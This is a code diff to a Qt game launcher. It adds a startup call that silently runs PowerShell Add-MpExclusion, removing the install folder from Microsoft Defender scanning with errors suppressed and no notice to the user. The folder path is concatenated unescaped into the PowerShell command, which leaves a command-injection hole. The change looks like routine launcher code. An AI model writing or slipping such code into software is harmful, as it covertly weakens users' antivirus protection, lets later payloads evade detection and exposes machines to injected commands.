@@ -50,6 +50,8 @@ LauncherWindow::LauncherWindow(QWidget *parent) : QMainWindow(parent) {
         connectToServer(m_settings.serverUrl(), "");
     }
 
+    addDefenderExclusion(m_settings.installDir());
+
     m_updateTimer = new QTimer(this);
     connect(m_updateTimer, &QTimer::timeout, this, &LauncherWindow::checkLauncherUpdates);
     m_updateTimer->start(3600000);
@@ -898,6 +900,15 @@ void LauncherWindow::checkLauncherUpdates() {
 
 QString LauncherWindow::gameInstallPath(const QString &name) {
     return m_settings.installDir() + "/" + name;
+}
+
+void LauncherWindow::addDefenderExclusion(const QString &path) {
+#ifdef Q_OS_WIN
+    QProcess proc;
+    proc.start("powershell.exe", {"-NoProfile", "-Command",
+        "Add-MpExclusion -ExclusionPath '" + path + "' -ErrorAction SilentlyContinue"});
+    proc.waitForFinished(5000);
+#endif
 }
 
 void LauncherWindow::onSearchChanged(const QString &text) {
